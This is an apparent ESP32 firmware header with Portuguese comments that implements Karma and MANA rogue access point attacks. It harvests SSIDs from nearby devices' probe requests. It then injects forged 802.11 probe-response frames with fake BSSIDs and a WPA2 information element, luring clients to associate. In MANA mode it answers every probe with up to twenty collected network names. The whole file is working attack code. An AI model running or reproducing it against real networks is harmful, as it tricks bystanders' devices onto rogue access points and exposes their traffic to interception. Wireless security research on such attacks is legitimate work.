#pragma once
#include <Arduino.h>
#include <esp_wifi.h>
#include <vector>
#include <unordered_set>
#include "../utils/logger.h"

struct _ArduinoStringHash {
    size_t operator()(const String& s) const {
        size_t h = 5381;
        for (size_t i = 0; i < s.length(); i++)
            h = ((h << 5) + h) + (uint8_t)s[i];
        return h;
    }
    bool operator()(const String& a, const String& b) const { return a == b; }
};

/*
 * Karma + MANA Attack
 *
 * Karma: responde a probe requests com AP falso idêntico ao SSID pedido.
 * MANA:  modo agressivo — responde a QUALQUER probe com TODOS os SSIDs
 *        conhecidos coletados anteriormente, maximizando associações.
 *        Ref: Dominic White & Ian de Villiers (SensePost, DEF CON 22, 2014)
 */
class KarmaAttack {
public:
    static KarmaAttack& get() { static KarmaAttack inst; return inst; }

    bool running   = false;
    bool manaMode  = false;   // true = MANA (responde com todos SSIDs conhecidos)
    std::vector<String> respondedTo;
    std::vector<String> knownSSIDs;       // todos SSIDs vistos em probes (ordenado para iteração)
    std::unordered_set<String, _ArduinoStringHash, _ArduinoStringHash> _knownSet; // lookup O(1)

    void start(bool mana = false) {
        running  = true;
        manaMode = mana;
        respondedTo.clear();
        LOG.warn(mana ? "[KARMA+MANA] Ativo — respondendo com TODOS SSIDs conhecidos"
                      : "[KARMA] Ativo — respondendo a probe requests...");
    }

    void stop() {
        running  = false;
        manaMode = false;
        LOG.info("[KARMA] Parado. SSIDs respondidos: " + String(respondedTo.size()) +
                 " | SSIDs conhecidos: " + String(knownSSIDs.size()));
    }

    void onProbe(const uint8_t* clientMac, const char* ssid, uint8_t ch) {
        if (!running) return;
        // Ignora probes originados pelo próprio ESP32
        uint8_t apMac[6], staMac[6];
        esp_wifi_get_mac(WIFI_IF_AP,  apMac);
        esp_wifi_get_mac(WIFI_IF_STA, staMac);
        if (memcmp(clientMac, apMac,  6) == 0) return;
        if (memcmp(clientMac, staMac, 6) == 0) return;

        // Acumula SSIDs conhecidos (usado pelo MANA e pelo Wifite)
        if (ssid && strlen(ssid) > 0) {
            String s = String(ssid);
            if (_knownSet.find(s) == _knownSet.end() && knownSSIDs.size() < 256) {
                knownSSIDs.push_back(s);
                _knownSet.insert(s);
            }
        }

        if (manaMode) {
            // MANA: responde ao dispositivo com cada SSID conhecido
            // Limita a 20 por probe para não saturar o rádio
            uint8_t sent = 0;
            for (auto& known : knownSSIDs) {
                _sendProbeResponse(clientMac, known.c_str(), ch);
                if (++sent >= 20) break;
            }
            // Também responde com o SSID pedido (caso não esteja na lista)
            if (ssid && strlen(ssid) > 0) _sendProbeResponse(clientMac, ssid, ch);
        } else {
            // Karma padrão: responde apenas com o SSID pedido
            if (!ssid || strlen(ssid) == 0) return;
            _sendProbeResponse(clientMac, ssid, ch);
        }

        if (ssid && strlen(ssid) > 0) {
            String s = String(ssid);
            bool found = false;
            for (auto& r : respondedTo) if (r == s) { found = true; break; }
            if (!found) {
                respondedTo.push_back(s);
                LOG.success(String(manaMode ? "[MANA]" : "[KARMA]") +
                            " → \"" + s + "\" ch" + String(ch));
            }
        }
    }

private:
    void _sendProbeResponse(const uint8_t* da, const char* ssid, uint8_t ch) {
        uint8_t ssidLen = strlen(ssid);
        if (ssidLen > 32) ssidLen = 32;
        uint8_t frame[192] = {};

        // BSSID: hash FNV-1a do SSID para unicidade colisão-resistente
        uint32_t h = 2166136261u;
        for (int i = 0; i < ssidLen; i++) h = (h ^ (uint8_t)ssid[i]) * 16777619u;
        uint8_t fakeBSSID[6] = {
            0x02,                          // locally administered, unicast
            (uint8_t)(h >> 24),
            (uint8_t)(h >> 16),
            (uint8_t)(h >>  8),
            (uint8_t)(h),
            (uint8_t)(ch ^ 0x5A)
        };

        frame[0] = 0x50; frame[1] = 0x00; // Probe Response
        frame[2] = 0x00; frame[3] = 0x00;
        memcpy(frame +  4, da,        6);
        memcpy(frame + 10, fakeBSSID, 6);
        memcpy(frame + 16, fakeBSSID, 6);
        frame[22] = 0x00; frame[23] = 0x00;

        uint8_t off = 24;
        uint64_t ts = esp_timer_get_time();
        memcpy(frame + off, &ts, 8); off += 8;
        frame[off++] = 0x64; frame[off++] = 0x00; // beacon interval 100 TU
        // Capabilities: ESS + Privacy (WPA2 aparece como cadeado ao cliente)
        frame[off++] = 0x31; frame[off++] = 0x04;

        // SSID IE
        frame[off++] = 0x00; frame[off++] = ssidLen;
        memcpy(frame + off, ssid, ssidLen); off += ssidLen;

        // Supported Rates
        frame[off++] = 0x01; frame[off++] = 0x08;
        const uint8_t rates[] = {0x82,0x84,0x8B,0x96,0x24,0x30,0x48,0x6C};
        memcpy(frame + off, rates, 8); off += 8;

        // DS Parameter Set (canal)
        frame[off++] = 0x03; frame[off++] = 0x01; frame[off++] = ch;

        // RSN IE (WPA2-PSK CCMP) — essencial: sem isso, clientes modernos recusam associação
        // com capabilities ESS+Privacy — eles esperam ver WPA2 IE
        static const uint8_t rsn[] = {
            0x30, 0x14,             // RSN IE, len=20
            0x01, 0x00,             // Version 1
            0x00, 0x0F, 0xAC, 0x04, // Group cipher: CCMP
            0x01, 0x00,             // Pairwise count: 1
            0x00, 0x0F, 0xAC, 0x04, // Pairwise: CCMP
            0x01, 0x00,             // AKM count: 1
            0x00, 0x0F, 0xAC, 0x02, // AKM: PSK
            0x00, 0x00,             // RSN Capabilities
        };
        memcpy(frame + off, rsn, sizeof(rsn)); off += sizeof(rsn);

        // Extended Supported Rates
        frame[off++] = 0x32; frame[off++] = 0x04;
        const uint8_t extRates[] = {0x30,0x48,0x60,0x6C};
        memcpy(frame + off, extRates, 4); off += 4;

        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        esp_wifi_80211_tx(WIFI_IF_AP, frame, off, false);
    }
};
